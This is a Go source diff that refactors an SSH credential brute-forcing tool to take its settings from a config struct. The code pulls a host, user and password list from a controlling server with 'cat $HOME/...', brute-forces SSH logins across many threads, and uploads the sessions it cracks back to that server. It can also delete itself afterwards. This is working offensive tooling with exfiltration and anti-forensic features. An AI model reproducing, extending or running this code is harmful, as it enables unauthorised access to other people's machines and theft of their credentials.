@@ -25,11 +25,11 @@ var wg sync.WaitGroup
 var DaC []vars.DelaConnection
 var serCon vars.Connection
 
-func Bf() {
+func Bf(conf vars.Config) {
 
 	flag.Parse()
 
-	if vars.BrFile == "" || vars.Host == "" || vars.Port == "" || vars.User == "" || vars.Pass == "" {
+	if conf.Flags.BrFile == "" || conf.Server.Host == "" || conf.Server.Port == "" || conf.Server.User == "" || conf.Server.Pass == "" {
 		return
 	}
 	dirname, err := os.UserHomeDir()
@@ -37,17 +37,17 @@ func Bf() {
 		fmt.Println(err)
 	}
 
-	vars.BrFileHomeDir = filepath.Join(dirname, vars.BrFile)
-	serCon.Host = vars.Host
-	serCon.Port = vars.Port
-	serCon.Username = vars.User
-	serCon.Password = vars.Pass
+	vars.BrFileHomeDir = filepath.Join(dirname, conf.Flags.BrFile)
+	serCon.Host = conf.Server.Host
+	serCon.Port = conf.Server.Port
+	serCon.Username = conf.Server.User
+	serCon.Password = conf.Server.Pass
 
 	msgSess := make(chan vars.Connection)
 	msgErr := make(chan vars.Connection)
 	go checkSession(msgSess, msgErr)
-	GetFileFromServer()
-	ReadCsv(msgSess, msgErr)
+	GetFileFromServer(conf.Flags.BrFile)
+	ReadCsv(msgSess, msgErr, conf.Flags.Combo, conf.Flags.Destr, conf.Flags.Threads)
 }
 
 func checkSession(msgSess, msgErr chan vars.Connection) {
@@ -72,7 +72,7 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 
 }
 
-func ReadCsv(msgSess, msgErr chan vars.Connection) {
+func ReadCsv(msgSess, msgErr chan vars.Connection, Combo, Destr bool, Threads int) {
 
 	file, err := os.ReadFile(vars.BrFileHomeDir)
 	if err != nil {
@@ -93,7 +93,7 @@ func ReadCsv(msgSess, msgErr chan vars.Connection) {
 	Users := []string{}
 	Passes := []string{}
 	c := vars.Connection{}
-	if vars.Combo {
+	if Combo {
 		for _, eachrecord := range records[1:] {
 			c.Host = eachrecord[0]
 			c.Username = eachrecord[1]
@@ -136,9 +136,9 @@ func ReadCsv(msgSess, msgErr chan vars.Connection) {
 		}
 	}
 
-	finalSessionsFound := StartBruteForce(&allC, msgSess, msgErr)
+	finalSessionsFound := StartBruteForce(&allC, msgSess, msgErr, Threads)
 	SendFileToServer(finalSessionsFound)
-	if vars.Destr {
+	if Destr {
 		SelfDel()
 	}
 }
@@ -186,10 +186,10 @@ func SendFileToServer(finalSessionsFound []vars.Connection) {
 	b.Reset()
 }
 
-func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Connection) []vars.Connection {
+func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Connection, Threads int) []vars.Connection {
 	foundSessions := []vars.Connection{}
 	for len(allConn.Conn) != 0 {
-		for i := 1; i <= vars.Threads; i++ {
+		for i := 1; i <= Threads; i++ {
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
@@ -266,14 +266,14 @@ func CreateConn(c vars.Connection) (*ssh.Session, vars.Connection, error) {
 	return session, c, nil
 }
 
-func GetFileFromServer() {
+func GetFileFromServer(BrFile string) {
 
 	session, _, err := CreateConn(serCon)
 	if err != nil {
 		fmt.Println("error")
 	}
 	session.Stdout = &b
-	erra := session.Run("cat $HOME/" + vars.BrFile)
+	erra := session.Run("cat $HOME/" + BrFile)
 	if erra != nil {
 		fmt.Println("error", erra)
 	}
